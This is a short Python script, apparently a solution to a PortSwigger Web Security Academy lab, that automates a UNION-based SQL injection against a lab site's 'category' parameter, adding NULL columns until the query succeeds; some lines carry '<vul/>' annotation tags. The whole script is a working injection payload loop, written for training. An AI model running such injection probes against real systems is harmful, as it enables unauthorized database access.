#!/usr/bin/env python3
import requests
import sys

# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

# API Parameters
<vul/>url = 'https://abcd.web-security-academy.net/page'</vul>
params = {'category': 'Lifestyle'}
<vul/>null = ["'UNION", 'SELECT', 'NULL', '--']</vul>
sqli = {'category': f"Lifestyle{' '.join(null)}"}

# API Request
api_session = requests.Session()
<vul/>response = api_session.get(url, params=sqli)</vul>

if response.status_code == 404:
    sys.exit('The session you are looking for has expired')

while not response.ok:
    null.pop(-1)
    null.extend([',NULL', '--'])
    sqli['category'] = f"Lifestyle{' '.join(null)}"
    response = api_session.get(url, params=sqli)

print(f"There are {null.count('NULL') + null.count(',NULL')} columns:")
print(response.url)
